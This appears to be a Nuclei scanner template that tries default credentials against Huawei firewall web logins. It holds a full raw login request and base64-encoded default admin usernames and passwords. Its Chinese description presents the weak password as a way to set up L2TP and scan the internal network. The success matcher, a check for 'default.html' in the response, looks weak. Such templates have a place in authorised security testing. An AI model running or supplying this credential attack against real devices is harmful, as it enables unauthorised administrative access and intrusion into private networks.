id: huawei-newfirewall-default-login

info:
  name: huawei-firewall-default-login
  author: apple
  severity: high
  description: 防火墙存在弱口令，可以配置l2tp进行内网扫描。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /default.html?dc=1714121310694 HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 113
        Cache-Control: max-age=0
        Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "macOS"
        Upgrade-Insecure-Requests: 1
        Origin: https://{{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Referer: https://{{Hostname}}/
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Priority: u=0, i
        Connection: close

        spring-security-redirect=&language=zh_CN&username={{username}}&password={{password}}&isLogin=true&platcontent=&platcontentConfirm=

    payloads:
      username:
        - YWRtaW4=
      password:
        - YWRtaW5AMTIz
        - aHVhd2VpQDEyMw==
        - YWRtaW5AaHVhd2VpLmNvbQ==     
        
    attack: pitchfork
    matchers:
      - type: word
        part: body
        words:
          - 'default.html'
